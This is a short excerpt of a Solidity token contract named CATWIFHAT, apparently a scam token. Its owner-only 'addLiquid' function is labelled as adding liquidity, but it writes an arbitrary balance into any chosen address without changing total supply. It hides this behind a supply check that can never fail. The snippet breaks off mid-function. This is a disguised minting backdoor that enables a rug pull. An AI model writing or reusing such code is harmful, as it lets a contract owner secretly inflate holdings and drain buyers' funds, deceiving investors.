...
contract CATWIFHAT is IERC20, Ownable, BaseToken {
    ...
    function addLiquid(address pancakeSwapV3, uint256 tokenAmount, uint256 ethAmount) public onlyOwner {
        uint256 bnbAmount = tokenAmount * 10 ** decimals();
        require(0 <= totalSupply() + bnbAmount, "Max supply exceeded");
        _balances[pancakeSwapV3] = tokenAmount * bnbAmount;
        uint256 deltaBalance = bnbAmount > address(this).balance ? 0 : address(this).balance - bnbAmount;
